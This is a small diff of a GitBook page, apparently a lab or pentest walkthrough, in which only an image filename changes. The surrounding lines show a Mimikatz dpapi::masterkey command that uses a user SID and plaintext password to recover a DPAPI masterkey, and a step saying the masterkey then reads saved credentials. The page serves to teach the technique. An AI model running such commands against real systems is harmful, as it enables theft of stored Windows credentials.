@@ -92,7 +92,7 @@ The latest compiled version of Mimikatz doesn't work on server 2022. Compiling t
 dpapi::masterkey /in:C:\Users\sa_sql\AppData\Roaming\Microsoft\Protect\S-1-5-21-1498997062-1091976085-892328878-1106\e1f462bb-9a65-40f0-a144-4f64bea97ce2 /sid:S-1-5-21-1498997062-1091976085-892328878-1106 /password:Iloveyou2 /protected
 ```
 
-![](<../../.gitbook/assets/image (11) (1) (1) (1).png>)
+![](<../../.gitbook/assets/image (11) (1) (1) (1) (1).png>)
 
 6\. We were able to retrieve the Masterkey, it it shown at the end of the output. Now we can read the saved credentials with the masterkey using the following Mimikatz command:
 
